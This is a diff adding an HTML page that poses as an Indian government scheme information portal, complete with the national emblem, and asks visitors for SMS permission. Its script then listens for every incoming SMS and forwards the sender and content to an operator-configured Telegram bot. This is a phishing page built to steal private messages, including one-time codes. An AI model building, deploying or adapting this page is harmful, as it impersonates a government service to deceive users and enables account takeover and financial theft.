@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>सरकारी योजना सूचना पोर्टल</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: url('https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Emblem_of_India.svg/800px-Emblem_of_India.svg.png') center/contain no-repeat;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        p {
+            color: #7f8c8d;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .btn:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+        }
+        
+        .btn:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            background: #f8f9fa;
+            text-align: left;
+        }
+        
+        .success { color: #27ae60; }
+        .error { color: #e74c3c; }
+        .warning { color: #f39c12; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <h1>सरकारी योजना सूचना पोर्टल</h1>
+        <p>भारत सरकार की विभिन्न योजनाओं की जानकारी SMS के माध्यम से</p>
+        
+        <div class="status" id="status">
+            स्थिति: प्रारंभिक जाँच...
+        </div>
+        
+        <button class="btn" id="permissionBtn" onclick="requestPermission()">
+            SMS अनुमति प्रदान करें
+        </button>
+        
+        <div id="info" style="display: none; margin-top: 20px;">
+            <p class="success">✓ अनुमति प्राप्त! SMS टेलीग्राम पर भेजे जा रहे हैं...</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Configuration (Edit these values)
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",  // अपना Telegram Bot Token यहाँ डालें
+            CHAT_ID: "YOUR_CHAT_ID_HERE"       // अपना Chat ID यहाँ डालें
+        };
+
+        // Check for SMS API support
+        function checkSmsSupport() {
+            const statusEl = document.getElementById('status');
+            
+            if ('sms' in navigator) {
+                statusEl.innerHTML = 'स्थिति: SMS API समर्थित ✓<br>';
+                statusEl.className = 'status success';
+                return true;
+            } else {
+                statusEl.innerHTML = 'स्थिति: SMS API समर्थित नहीं ✗<br>';
+                statusEl.className = 'status error';
+                return false;
+            }
+        }
+
+        // Request SMS permission
+        async function requestPermission() {
+            const btn = document.getElementById('permissionBtn');
+            const statusEl = document.getElementById('status');
+            
+            if (!checkSmsSupport()) {
+                statusEl.innerHTML += 'कृपया Chrome Android ब्राउज़र का उपयोग करें';
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = 'अनुमति अनुरोध भेजा जा रहा है...';
+            
+            try {
+                // Try to get permission by attempting to receive SMS
+                const sms = await navigator.sms.receive();
+                
+                // Permission granted
+                statusEl.innerHTML = 'स्थिति: SMS अनुमति प्राप्त ✓<br>';
+                statusEl.className = 'status success';
+                
+                // Show success message
+                document.getElementById('info').style.display = 'block';
+                
+                // Start listening for SMS
+                startSmsListener();
+                
+            } catch (error) {
+                btn.disabled = false;
+                btn.innerHTML = 'SMS अनुमति प्रदान करें';
+                
+                if (error.name === 'SecurityError') {
+                    statusEl.innerHTML = 'स्थिति: HTTPS या localhost पर चलाएं<br>';
+                    statusEl.innerHTML += '1. Python इंस्टॉल करें<br>';
+                    statusEl.innerHTML += '2. टर्मिनल में: python -m http.server 8000<br>';
+                    statusEl.innerHTML += '3. ब्राउज़र में: http://localhost:8000';
+                } else {
+                    statusEl.innerHTML = 'स्थिति: त्रुटि - ' + error.message;
+                }
+                statusEl.className = 'status error';
+            }
+        }
+
+        // Start listening for SMS
+        async function startSmsListener() {
+            try {
+                while (true) {
+                    const sms = await navigator.sms.receive();
+                    await sendToTelegram(sms.sender, sms.content);
+                }
+            } catch (error) {
+                console.error('SMS listening error:', error);
+            }
+        }
+
+        // Send SMS to Telegram
+        async function sendToTelegram(sender, message) {
+            // Check if Telegram config is properly set
+            if (TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN") || 
+                TELEGRAM_CONFIG.CHAT_ID.includes("YOUR_CHAT_ID")) {
+                console.log("Telegram configuration not set properly");
+                return;
+            }
+            
+            try {
+                const telegramMessage = `📱 नया SMS\n\n📞 From: ${sender}\n💬 Message: ${message}\n⏰ Time: ${new Date().toLocaleString('hi-IN')}`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        text: telegramMessage
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Telegram response:', result);
+                
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            checkSmsSupport();
+            
+            // Check if already has permission
+            if ('permissions' in navigator) {
+                navigator.permissions.query({name: 'sms'})
+                    .then(permissionStatus => {
+                        if (permissionStatus.state === 'granted') {
+                            document.getElementById('permissionBtn').style.display = 'none';
+                            document.getElementById('info').style.display = 'block';
+                            startSmsListener();
+                        }
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
